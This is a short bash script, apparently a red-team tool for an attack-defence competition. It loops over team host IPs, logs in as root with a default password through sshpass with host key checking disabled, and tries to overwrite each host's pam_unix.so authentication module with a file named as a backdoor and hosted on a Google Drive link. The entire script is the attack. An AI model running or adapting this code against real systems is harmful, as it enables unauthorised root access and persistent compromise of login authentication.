#!/bin/bash

IPs=()
username="root"
default_password="Password1!"
timeout_duration=3
path_to_pam="/lib/x86_64-linux-gnu/security"
backdoor_link="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"

create_IPs() {
    network_id="1.1"
    number_of_teams=3
    host_ids=(1 2 3)
    for ((team=1; team<=number_of_teams; team++)); do
        for host_id in "${host_ids[@]}"; do
            IPs+=("$network_id.$team.$host_id")
        done
    done
}

main() {
    create_IPs
    export default_password timeout_duration username path_to_pam backdoor_link

    printf "%s\n" "${IPs[@]}" | xargs -P 20 -n1 -I {} bash -c '
        IP="{}"
        sshpass -p "$default_password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$backdoor_link" "$username@$IP:$path_to_pam/pam_unix.so" || true
    '
}

main
